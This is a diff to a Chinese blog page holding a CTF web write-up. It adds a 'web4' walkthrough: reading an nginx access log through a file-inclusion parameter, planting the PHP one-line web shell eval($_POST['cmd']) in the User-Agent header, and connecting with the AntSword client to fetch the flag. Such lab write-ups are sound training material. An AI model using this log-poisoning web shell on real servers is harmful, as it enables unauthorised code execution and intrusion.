@@ -28,8 +28,13 @@
 <meta property="og:image" content="http://example.com/images/2.png">
 <meta property="og:image" content="http://example.com/images/3.png">
 <meta property="og:image" content="http://example.com/images/4.png">
+<meta property="og:image" content="http://example.com/images/5.png">
+<meta property="og:image" content="http://example.com/images/6.png">
+<meta property="og:image" content="http://example.com/images/7.png">
+<meta property="og:image" content="http://example.com/images/8.png">
+<meta property="og:image" content="http://example.com/images/9.png">
 <meta property="article:published_time" content="2023-04-18T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-04-24T16:30:25.325Z">
+<meta property="article:modified_time" content="2023-04-25T08:35:41.858Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/fuck.png">
@@ -242,7 +247,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          711 字
+          1k 字
         
       </span>
     
@@ -253,7 +258,7 @@
         
         
         
-          6 分钟
+          9 分钟
         
       </span>
     
@@ -322,6 +327,20 @@
 <p>很明显这个ctf_go_go_go文件就是存放flag的文件<br><img src="/images/4.png" srcset="/img/loading.gif" lazyload><br>我们直接在url地址中拼接url参数，访问ctf_go_go文件</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=ctf_go_go_go<br></code></pre></td></tr></table></figure>
 <p>成功获取flag!</p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>进入题目，看到只有一句文件包含的提示。<br>这题使用input协议data协议都不可行，应该是被禁用了，所以从数据包入手<br><img src="/images/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们发现该道题使用的是nginx服务器，那我们想到可不可以通过日志文件进行写码得到flag呢，所以我们访问日志看看</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=<span class="hljs-regexp">/var/</span>lg<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/6.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>查看日志发现，每访问一次数据包中的User-Agent头会被写进日志中，那就尝试在UA头中写码</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/7.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>在UA头后插入一句话木马后日志文件里并未显示说明木马已经被解析了，然后使用蚁剑连接。</p>
+</blockquote>
+<p><img src="/images/8.png" srcset="/img/loading.gif" lazyload><br>连接后，flag就在网页根目录中<br><img src="/images/9.png" srcset="/img/loading.gif" lazyload><br>获得flag！</p>
 
                 
               </div>
